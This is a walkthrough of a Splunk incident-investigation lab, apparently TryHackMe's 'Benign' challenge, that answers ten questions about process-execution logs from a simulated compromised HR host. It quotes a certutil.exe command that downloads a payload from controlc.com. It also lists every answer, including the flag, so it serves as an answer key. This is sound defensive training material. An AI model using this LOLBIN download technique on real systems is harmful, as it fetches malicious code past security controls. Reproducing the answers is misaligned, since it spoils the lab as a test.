<h1>Benign Challenge Lab (Splunk)</h1>

<h2>Description</h2>

One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation.

<h3>About the Network Information</h3>

The network is divided into three logical segments. It will help in the investigation.

<b>IT Department</b>

James<br>
Moin<br>
Katrina<br>

<b>HR department</b>

Haroon<br>
Chris<br>
Diana<br>

<b>Marketing department</b>

Bell<br>
Amelia<br>
Deepak<br>

<h2>Walkthrough</h2>

<b>Question 1: How many logs are ingested from the month of March, 2022?</b>
<br><br>
To find this information, I simply changed the time period of the logs to only show dates from March 2022. In this case, even when you choose "all time", this index shows the same results inlcuded all 13959 events.
<br><br>
<b>Answer:</b> 13,959

<b>Question 2: Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?</b>
<br><br>
For this answer, I used:
<br>
| table UserName <br>
| dedup UserName
<br><br>
This allowed me to see a list of the usernames only one time, which is where I found the imposter "Amel1a" where the imposter changed the "i" in Amelia in to a 1.
<br><br>
<b>Answer:</b> Amel1a

<b>Question 3: Which user from the HR department was observed to be running scheduled tasks?</b>
<br><br>
By adding "schtasks" to the search, then clicking the CommandLine field, there are only 5 commands and the only username shown is chris.fort
<br><br>
<b>Answer:</b> Chris.fort

<b>Question 4: Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?</b>
<br><br>I used google to search binaries used to download payloads (loblins) and found "certutil.exe". I added that to the search in Splunk and 1 event appeared connected to username Haroon.
<br><br>
<b>Answer:</b> Haroon

<b>Question 5: To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?</b>
<br><br>The answer stemmed from the results found in question #4 which is the certutil.exe utility being used to download the file from the URL "https://controlc.com/e4d11035". Here's the full command line prompt: certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
<br><br>
<b>Answer:</b> certutil.exe

<b>Question 6: What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)</b>
<br><br>This answer was quickly found by looking at the same event I already have pulled up and looking at the Event Time.
<br><br>
<b>Answer:</b> 2022-03-04

<b>Question 7: Which third-party site was accessed to download the malicious payload?</b>
<br><br>This answer was quickly found as well by looking at the command line prompt
<br><br>
<b>Answer:</b> controlc.com

<b>Question 8: What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?</b>
<br><br>This answer was quickly found as well by looking at the command line prompt
<br><br>
<b>Answer:</b> benign.exe

<b>Question 9: The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?</b>
<br><br>I visited the site within the command line to find this answer (controlc.com/e4d11035)
<br><br>
<b>Answer:</b> THM{KJ&*H^B0}

<b>Question 10: What is the URL that the infected host connected to?</b>
<br><br>This answer was also taken from the last question where the entire URL was the final answer
<br><br>
<b>Answer:</b> controlc.com/e4d11035

















